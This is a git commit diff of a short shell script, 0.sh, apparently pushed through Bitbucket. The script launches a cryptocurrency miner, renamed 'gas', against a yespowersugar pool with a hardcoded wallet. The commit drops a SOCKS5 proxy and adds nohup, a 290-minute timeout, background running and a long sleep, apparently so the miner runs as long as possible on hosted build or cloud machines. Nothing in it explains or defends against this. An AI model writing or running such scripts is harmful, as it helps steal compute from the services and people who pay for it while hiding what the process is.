fa0b2fe41808930b41eac20834e8270145162f11
sis maryanto <sismaryanto1928@gmail.com>
2021-06-30 01:42:29 +0000

    0.sh edited online with Bitbucket

--- 0.sh
+++ 0.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
 POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
 WALLET=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.ahaha
-./gas -a yespowersugar -o $POOL -u $WALLET -t2 -x socks5://72.49.49.11:31034
+nohup timeout 290m ./gas -a yespowersugar -o $POOL -u $WALLET -t2 &
+jobs
+echo "haha"
+apt-get update -y
+sleep 295m
